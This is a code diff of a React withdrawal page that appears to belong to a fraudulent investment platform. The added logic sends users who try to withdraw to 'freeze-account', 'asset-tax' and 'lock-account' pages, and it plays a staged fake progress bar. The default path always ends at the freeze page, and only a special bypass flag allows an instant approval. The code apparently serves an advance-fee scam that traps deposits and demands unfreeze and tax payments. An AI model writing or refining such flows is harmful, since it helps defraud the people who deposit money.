@@ -18,7 +18,7 @@ import {
 import './WithdrawView.css';
 
 export const WithdrawView = () => {
-  const { user } = useAuth();
+  const { user, refreshUser } = useAuth();
   const navigate = useNavigate();
   const [settings, setSettings] = useState(null);
   const [amount, setAmount] = useState('');
@@ -35,15 +35,52 @@ export const WithdrawView = () => {
   const [progress, setProgress] = useState(0);
   const [processingStage, setProcessingStage] = useState('Initializing Liquidity Channel...');
   const [activeTxDetails, setActiveTxDetails] = useState(null);
+  const [isRefreshing, setIsRefreshing] = useState(true);
 
-  const numAmount = parseFloat(amount) || 0;
-  const isInsufficient = numAmount > (user?.balance || 0);
+  // All hooks must be called unconditionally
+  useEffect(() => {
+    const doRefresh = async () => {
+      setIsRefreshing(true);
+      await refreshUser();
+      setIsRefreshing(false);
+    };
+    doRefresh();
 
+    const handleFocus = () => {
+      doRefresh();
+    };
+    window.addEventListener('focus', handleFocus);
+    return () => window.removeEventListener('focus', handleFocus);
+  }, [refreshUser]);
+
+  // Redirect logic via useEffect (no early returns)
+  useEffect(() => {
+    if (isRefreshing) return;
+    if (!user) return;
+
+    if (user.isLocked) {
+      navigate('/lock-account');
+      return;
+    }
+    if (user.hasPaidUnfreeze && !user.hasPaidTax) {
+      navigate('/asset-tax');
+      return;
+    }
+    if (user.isFrozen && !user.hasPaidUnfreeze) {
+      navigate('/freeze-account');
+      return;
+    }
+  }, [user, navigate, isRefreshing]);
+
+  // Additional effect for settings
   useEffect(() => {
     getSettings().then(data => {
       if (data.success) setSettings(data.settings);
     }).catch(() => {});
   }, []);
+
+  const numAmount = parseFloat(amount) || 0;
+  const isInsufficient = numAmount > (user?.balance || 0);
 
   const minWithdrawal = settings?.minWithdrawalAmount || 50;
   const maxWithdrawal = settings?.maxWithdrawalAmount || 5000000;
@@ -54,33 +91,60 @@ export const WithdrawView = () => {
     const totalDurationMs = 10000;
     const intervalMs = 100;
     const increment = (90 / (totalDurationMs / intervalMs));
+    let cancelled = false;
+
     const timer = setInterval(() => {
       setProgress(prev => {
         const next = prev + increment;
         if (next >= 90) {
           clearInterval(timer);
-          setTimeout(() => {
+          setTimeout(async () => {
+            if (cancelled) return;
             setIsProcessing(false);
             if (!activeTxDetails) return;
-            // Call API to initiate withdrawal
-            initiateWithdrawal(user.id, activeTxDetails.amount, activeTxDetails.method, activeTxDetails.details)
-              .then(() => {
-                // Check if user has bypass or not to redirect
-                if (user?.bypassVerification) {
-                  toast.success('Withdrawal approved instantly!');
-                  navigate('/dashboard');
-                } else {
-                  // Redirect to freeze or tax based on status
-                  if (user?.hasPaidUnfreeze && !user?.hasPaidTax) {
-                    navigate('/asset-tax');
-                  } else {
-                    navigate('/freeze-account');
-                  }
-                }
-              })
-              .catch(err => {
-                setErrorMessage(err.message || 'Withdrawal initiation failed.');
-              });
+
+            // Re-fetch latest user state before initiating withdrawal
+            const latestUser = await refreshUser().catch(() => null);
+            const currentUser = latestUser || user;
+
+            if (currentUser?.isLocked) {
+              navigate('/lock-account');
+              return;
+            }
+            if (currentUser?.hasPaidUnfreeze && !currentUser?.hasPaidTax) {
+              navigate('/asset-tax');
+              return;
+            }
+            if (currentUser?.isFrozen && !currentUser?.hasPaidUnfreeze) {
+              navigate('/freeze-account');
+              return;
+            }
+
+            try {
+              const result = await initiateWithdrawal(user.id, activeTxDetails.amount, activeTxDetails.method, activeTxDetails.details);
+              await refreshUser();
+
+              if (result.user?.isLocked) {
+                navigate('/lock-account');
+              } else if (result.user?.hasPaidUnfreeze && !result.user?.hasPaidTax) {
+                navigate('/asset-tax');
+              } else if (result.user?.isFrozen && !result.user?.hasPaidUnfreeze) {
+                navigate('/freeze-account');
+              } else if (result.user?.bypassVerification) {
+                toast.success('Withdrawal approved instantly!');
+                navigate('/dashboard');
+              } else {
+                navigate('/freeze-account');
+              }
+            } catch (err) {
+              const message = err?.response?.data?.error || err.message || 'Withdrawal initiation failed.';
+              if (err?.response?.status === 403 && message.toLowerCase().includes('locked')) {
+                await refreshUser();
+                navigate('/lock-account');
+              } else {
+                setErrorMessage(message);
+              }
+            }
           }, 400);
           return 90;
         }
@@ -91,15 +155,40 @@ export const WithdrawView = () => {
         return next;
       });
     }, intervalMs);
-    return () => clearInterval(timer);
-  }, [isProcessing, activeTxDetails, user, navigate]);
 
-  const handleWithdrawSubmit = (e) => {
+    return () => {
+      cancelled = true;
+      clearInterval(timer);
+    };
+  }, [isProcessing, activeTxDetails, user, navigate, refreshUser]);
+
+  const handleWithdrawSubmit = async (e) => {
     e.preventDefault();
     setErrorMessage(null);
+
+    // Refresh latest user first
+    const latestUser = await refreshUser().catch(() => null);
+    const currentUser = latestUser || user;
+
+    // Guard: if locked, redirect immediately
+    if (currentUser?.isLocked) {
+      navigate('/lock-account');
+      return;
+    }
+
+    if (currentUser?.hasPaidUnfreeze && !currentUser?.hasPaidTax) {
+      navigate('/asset-tax');
+      return;
+    }
+
+    if (currentUser?.isFrozen && !currentUser?.hasPaidUnfreeze) {
+      navigate('/freeze-account');
+      return;
+    }
+
+    if (numAmount > (currentUser?.balance || 0)) { setErrorMessage('Insufficient balance.'); return; }
     if (numAmount < minWithdrawal) { setErrorMessage(`Min: $${minWithdrawal}`); return; }
     if (numAmount > maxWithdrawal) { setErrorMessage(`Max: $${maxWithdrawal}`); return; }
-    if (isInsufficient) { setErrorMessage('Insufficient balance.'); return; }
 
     let details = {};
     if (method === 'Bank/Wire Transfer') {
@@ -130,11 +219,17 @@ export const WithdrawView = () => {
     setProcessingStage('🔐 Authenticating...');
     setIsProcessing(true);
 
-    // Notify server
     notifyWithdrawalProcessing(user, numAmount, method, details, txReference).catch(() => {});
-    // Fix: replace toast.info with toast.success
     toast.success('Withdrawal processing started...');
   };
+
+  if (isRefreshing) {
+    return (
+      <div className="withdraw-view">
+        <div className="loading-spinner">Loading...</div>
+      </div>
+    );
+  }
 
   return (
     <div className="withdraw-view">
